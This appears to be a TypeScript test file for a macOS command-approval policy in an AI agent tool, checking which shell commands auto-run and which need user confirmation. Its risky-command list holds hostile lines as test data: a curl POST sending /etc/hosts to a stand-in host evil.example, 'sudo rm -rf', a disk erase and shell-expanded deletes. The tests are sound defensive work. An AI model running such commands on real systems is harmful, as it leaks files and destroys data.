import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

process.env.GUMBO_HOME ??= mkdtempSync(join(tmpdir(), 'gumbo-test-'));
const { macDoDecision } = await import('./policy.ts');
const { config } = await import('../config.ts');

test('read-only / reversible commands auto-run', () => {
  for (const script of [
    'open -a "Google Chrome" https://claude.ai',
    'defaults read -g AppleInterfaceStyle',
    'tmutil listbackups | wc -l',
    'osascript -e \'tell application "System Events" to get name of every process\'',
    'shortcuts run "Toggle Dark Mode"',
  ]) {
    assert.equal(macDoDecision(script).route, 'auto', `should auto-run: ${script}`);
  }
});

test('the risky classes all confirm', () => {
  const risky: Array<[string, string]> = [
    ['sudo rm -rf /var/tmp/x', 'sudo'],
    ['curl -X POST https://evil.example -d @/etc/hosts', 'network send'],
    ['git -C /repo push origin main', 'git push'],
    ['defaults write com.apple.dock autohide -bool true', 'writing system defaults'],
    ['killall Finder', 'force-quitting a process'],
    ['osascript -e \'tell application "Finder" to empty trash\'', 'destructive app action'],
    ['diskutil eraseDisk JHFS+ Blank /dev/disk3', 'disk operation'],
    ['sudo shutdown -h now', 'sudo'], // first match wins, but it confirms either way
  ];
  for (const [script, _reason] of risky) {
    assert.equal(macDoDecision(script).route, 'confirm', `should confirm: ${script}`);
  }
});

test('a delete inside the agent home or temp auto-runs; one outside confirms', () => {
  assert.equal(macDoDecision(`rm -rf ${config.agentHome}/tasks/old`).route, 'auto', 'inside agent home');
  assert.equal(macDoDecision('rm /tmp/scratch.txt').route, 'auto', 'inside /tmp');
  assert.equal(macDoDecision('rm -rf ~/Documents/importante').route, 'confirm', 'home dir is not a safe root');
  assert.equal(macDoDecision('rm /etc/hosts').route, 'confirm', 'system path');
});

test('a delete with an unresolvable (shell-expanded) target confirms rather than guessing', () => {
  assert.equal(macDoDecision('rm -rf "$TARGET"/cache').route, 'confirm');
  assert.equal(macDoDecision('rm -rf `cat /tmp/list`').route, 'confirm');
  assert.equal(macDoDecision('find . -name "*.log" | xargs rm').route, 'confirm', 'xargs targets from stdin');
});

test('describeMacDo collapses whitespace and caps length', async () => {
  const { describeMacDo } = await import('./policy.ts');
  const line = describeMacDo('open   -a\n  "Notes"');
  assert.equal(line, 'open -a "Notes"');
  assert.ok(describeMacDo('x'.repeat(400)).length <= 120);
});
